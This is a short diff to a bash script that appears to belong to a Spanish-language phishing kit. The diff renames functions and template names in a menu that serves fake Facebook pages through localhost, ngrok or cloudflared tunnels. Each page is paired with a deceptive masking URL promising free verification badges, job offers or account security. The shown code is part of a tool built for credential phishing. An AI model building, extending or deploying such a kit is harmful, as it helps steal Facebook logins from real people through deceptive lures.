@@ -454,11 +454,11 @@ tunnel_menu() {
 
 	case $REPLY in 
 		1 | 01)
-			empezar_localhost;;
+			start_localhost;;
 		2 | 02)
-			empezar_ngrok;;
+			start_ngrok;;
 		3 | 03)
-			empezar_cloudflared;;
+			start_cloudflared;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opcion invalida, Trata de nuevo..."
 			{ sleep 1; tunnel_menu; };;
@@ -484,12 +484,12 @@ site_facebook() {
 			mask='http://insignia-azul-verificada-para-facebook-gratis'
 			tunnel_menu;;
 		2 | 02)
-			website="fb_Vacantes"
+			website="fb_advanced"
 			mask='http://Postulate-en-los-mejores-empleos'
 			tunnel_menu;;
 		3 | 03)
-			website="fb_seguridad"
-			mask='http://haz-tu-facebook-asegurado-y-libre-de-hackers'
+			website="fb_security"
+			mask='http://haz-tu-facebook-seguro-y-libre-de-hackers'
 			tunnel_menu;;
 		4 | 04)
 			website="fb_messenger"
